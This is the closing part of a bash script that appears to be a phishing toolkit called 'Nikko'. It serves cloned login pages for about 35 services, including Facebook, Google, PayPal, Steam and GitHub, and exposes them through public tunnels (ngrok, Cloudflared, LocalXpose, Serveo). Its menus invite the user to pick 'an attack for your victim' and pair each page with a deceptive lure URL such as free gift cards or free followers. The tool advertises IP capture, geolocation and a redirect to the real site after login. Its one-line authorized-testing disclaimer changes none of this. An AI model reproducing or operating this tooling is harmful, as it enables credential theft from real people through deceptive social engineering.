                echo -e "${YELLOW}[!]${NC} Ngrok URL not found. Check: http://127.0.0.1:4040"
            fi
            ;;
        2|02)
            if ! command -v cloudflared &>/dev/null; then
                echo -e "\n${RED}[!]${NC} Cloudflared not installed."
                echo -e "${YELLOW}  Install: wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb && sudo dpkg -i cloudflared-linux-amd64.deb${NC}"
                tunnel_menu; return
            fi
            echo -e "\n${GREEN}[+]${NC} Starting Cloudflared (HTTPS)..."
            cloudflared tunnel --url "http://$LOCAL_HOST:$SERVER_PORT" --logfile "$BASE_DIR/.cldlog" 2>/dev/null &
            TUNNEL_PID=$!; sleep 6
            PUBLIC_URL=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' "$BASE_DIR/.cldlog" 2>/dev/null | head -1)
            rm -f "$BASE_DIR/.cldlog" 2>/dev/null
            if [ -n "$PUBLIC_URL" ]; then
                echo -e "${GREEN}[+]${NC} ${CYAN}$PUBLIC_URL${NC}"
                mask_url "$PUBLIC_URL" "$MASK"
            else
                echo -e "${YELLOW}[!]${NC} Check terminal output above for Cloudflared URL."
            fi
            ;;
        3|03)
            if ! command -v localxpose &>/dev/null; then
                echo -e "\n${RED}[!]${NC} LocalXpose not installed."
                echo -e "${YELLOW}  Install: sudo snap install localxpose && localxpose account login${NC}"
                tunnel_menu; return
            fi
            echo -e "\n${GREEN}[+]${NC} Starting LocalXpose (HTTPS)..."
            localxpose tunnel http --https-redirect -t "$LOCAL_HOST:$SERVER_PORT" 2>/dev/null &
            TUNNEL_PID=$!; sleep 5
            PUBLIC_URL=$(curl -s http://127.0.0.1:4040/api/tunnels 2>/dev/null | grep -o '"public_url":"https://[^"]*"' | cut -d'"' -f4)
            if [ -z "$PUBLIC_URL" ]; then
                echo -e "${GREEN}[+]${NC} LocalXpose started. Check: https://localxpose.io/dashboard"
            else
                echo -e "${GREEN}[+]${NC} ${CYAN}$PUBLIC_URL${NC}"
                mask_url "$PUBLIC_URL" "$MASK"
            fi
            ;;
        4|04)
            echo -e "\n${GREEN}[+]${NC} Starting Serveo (HTTPS)..."
            ssh -o StrictHostKeyChecking=no -R 80:"$LOCAL_HOST:$SERVER_PORT" serveo.net 2>/dev/null &
            TUNNEL_PID=$!; sleep 6
            echo -e "${GREEN}[+]${NC} Check terminal above. URL format: https://xxxx.serveo.net"
            ;;
        5|05)
            echo -e "\n${YELLOW}[!]${NC} Localhost only."
            echo -e "${CYAN}  http://$LOCAL_HOST:$SERVER_PORT${NC}"
            ;;
        *) tunnel_menu ;;
    esac
    start_monitor "$TEMPLATE_DIR"
}

site_facebook() {
    banner_small
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Select Facebook Attack ${RED}[${WHITE}::${RED}]${ORANGE}"
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page"
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" ch
    case $ch in 1|01) WEBSITE="facebook"; MASK='https://blue-verified-badge-for-facebook-free';; 2|02) WEBSITE="fb_advanced"; MASK='https://vote-for-the-best-social-media';; 3|03) WEBSITE="fb_security"; MASK='https://make-your-facebook-secured';; 4|04) WEBSITE="fb_messenger"; MASK='https://get-messenger-premium-features-free';; *) site_facebook;; esac
    tunnel_menu
}

site_instagram() {
    banner_small
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Select Instagram Attack ${RED}[${WHITE}::${RED}]${ORANGE}"
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Auto Follower Phishing Page"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Verification Badge Method"
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" ch
    case $ch in 1|01) WEBSITE="instagram"; MASK='https://get-unlimited-followers-for-instagram';; 2|02) WEBSITE="ig_follower"; MASK='https://free-instagram-followers-2025';; 3|03) WEBSITE="ig_badge"; MASK='https://get-instagram-verified-badge-free';; *) site_instagram;; esac
    tunnel_menu
}

site_gmail() {
    banner_small
    echo -e "\n${RED}[${WHITE}::${RED}]${ORANGE} Select Google Attack ${RED}[${WHITE}::${RED}]${ORANGE}"
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Gmail New Login Page"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Gmail Old Login Page"
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" ch
    case $ch in 1|01) WEBSITE="google"; MASK='https://get-1tb-cloud-storage-free';; 2|02) WEBSITE="google_old"; MASK='https://google-photo-editor-free';; *) site_gmail;; esac
    tunnel_menu
}

site_vk() { WEBSITE="vk"; MASK='https://get-unlimited-vk-followers-free'; tunnel_menu; }

about() {
    banner
    echo -e "${ORANGE}  Nikko v${version} — Automated Phishing Tool${NC}"
    echo -e "${ORANGE}  For authorized penetration testing only${NC}"
    echo -e "\n  ${WHITE}Templates:${NC} 35+ phishing page templates"
    echo -e "  ${WHITE}Tunneling:${NC} Ngrok (HTTPS), Cloudflared (HTTPS), LocalXpose (HTTPS), Serveo (HTTPS)"
    echo -e "  ${WHITE}Features:${NC} Instant IP capture on visit, real-time inotify monitoring, IP geolocation + ISP"
    echo -e "  ${WHITE}          ${NC} Browser fingerprinting, URL masking, redirects to REAL site after login"
    echo -e "  ${WHITE}          ${NC} No allow_url_fopen dependency (uses curl)"
    echo -e "\n  ${YELLOW}Warning:${NC} Use only on systems you own or have explicit written permission to test."
    echo ""; read -p "  Press Enter to return to menu..."; main_menu
}

main_menu() {
    banner
    echo -e "${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}"
    echo ""
    echo -e "${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch        ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt"
    echo -e "${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest     ${RED}[${WHITE}22${RED}]${ORANGE} Badoo"
    echo -e "${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat      ${RED}[${WHITE}23${RED}]${ORANGE} Origin"
    echo -e "${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin      ${RED}[${WHITE}24${RED}]${ORANGE} DropBox"
    echo -e "${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay          ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo"
    echo -e "${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora         ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress"
    echo -e "${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail    ${RED}[${WHITE}27${RED}]${ORANGE} Yandex"
    echo -e "${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify       ${RED}[${WHITE}28${RED}]${ORANGE} StackOverflow"
    echo -e "${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit        ${RED}[${WHITE}29${RED}]${ORANGE} Vk"
    echo -e "${RED}[${WHITE}10${RED}]${ORANGE} TikTok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe         ${RED}[${WHITE}30${RED}]${ORANGE} XBOX"
    echo -e "${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}33${RED}]${ORANGE} Github        ${RED}[${WHITE}35${RED}]${ORANGE} Roblox"
    echo -e "${RED}[${WHITE}32${RED}]${ORANGE} Gitlab        ${RED}[${WHITE}34${RED}]${ORANGE} Discord"
    echo ""
    echo -e "${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit"
    echo ""
    read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}" ch
    case $ch in
        1|01) site_facebook ;; 2|02) site_instagram ;; 3|03) site_gmail ;;
        4|04) WEBSITE="microsoft"; MASK='https://unlimited-onedrive-space-for-free'; tunnel_menu ;;
        5|05) WEBSITE="netflix"; MASK='https://upgrade-your-netflix-plan-free'; tunnel_menu ;;
        6|06) WEBSITE="paypal"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        7|07) WEBSITE="steam"; MASK='https://steam-500-usd-gift-card-free'; tunnel_menu ;;
        8|08) WEBSITE="twitter"; MASK='https://get-blue-badge-on-twitter-free'; tunnel_menu ;;
        9|09) WEBSITE="playstation"; MASK='https://playstation-500-usd-gift-card-free'; tunnel_menu ;;
        10) WEBSITE="tiktok"; MASK='https://tiktok-free-liker'; tunnel_menu ;;
        11) WEBSITE="twitch"; MASK='https://unlimited-twitch-tv-user-for-free'; tunnel_menu ;;
        12) WEBSITE="pinterest"; MASK='https://get-a-premium-plan-for-pinterest-free'; tunnel_menu ;;
        13) WEBSITE="snapchat"; MASK='https://view-locked-snapchat-accounts-secretly'; tunnel_menu ;;
        14) WEBSITE="linkedin"; MASK='https://get-a-premium-plan-for-linkedin-free'; tunnel_menu ;;
        15) WEBSITE="ebay"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        16) WEBSITE="quora"; MASK='https://quora-premium-for-free'; tunnel_menu ;;
        17) WEBSITE="protonmail"; MASK='https://protonmail-pro-basics-for-free'; tunnel_menu ;;
        18) WEBSITE="spotify"; MASK='https://convert-your-account-to-spotify-premium'; tunnel_menu ;;
        19) WEBSITE="reddit"; MASK='https://reddit-official-verified-member-badge'; tunnel_menu ;;
        20) WEBSITE="adobe"; MASK='https://get-adobe-lifetime-pro-membership-free'; tunnel_menu ;;
        21) WEBSITE="deviantart"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        22) WEBSITE="badoo"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        23) WEBSITE="origin"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        24) WEBSITE="dropbox"; MASK='https://get-1tb-cloud-storage-free'; tunnel_menu ;;
        25) WEBSITE="yahoo"; MASK='https://grab-mail-from-anyother-yahoo-account-free'; tunnel_menu ;;
        26) WEBSITE="wordpress"; MASK='https://unlimited-wordpress-traffic-free'; tunnel_menu ;;
        27) WEBSITE="yandex"; MASK='https://grab-mail-from-anyother-yandex-account-free'; tunnel_menu ;;
        28) WEBSITE="stackoverflow"; MASK='https://get-stackoverflow-lifetime-pro-membership-free'; tunnel_menu ;;
        29) site_vk ;;
        30) WEBSITE="xbox"; MASK='https://get-500-usd-free-to-your-acount'; tunnel_menu ;;
        31) WEBSITE="mediafire"; MASK='https://get-1tb-on-mediafire-free'; tunnel_menu ;;
        32) WEBSITE="gitlab"; MASK='https://get-1k-followers-on-gitlab-free'; tunnel_menu ;;
        33) WEBSITE="github"; MASK='https://get-1k-followers-on-github-free'; tunnel_menu ;;
        34) WEBSITE="discord"; MASK='https://get-discord-nitro-free'; tunnel_menu ;;
        35) WEBSITE="roblox"; MASK='https://get-free-robux'; tunnel_menu ;;
        99) about ;;
        0|00) echo -e "\n${GREEN}[+] Exiting.${NC}"; exit 0 ;;
        *) echo -e "\n${RED}[!] Invalid option.${NC}"; sleep 1; main_menu ;;
    esac
}

dependencies
mkdir -p "$BASE_DIR"
main_menu
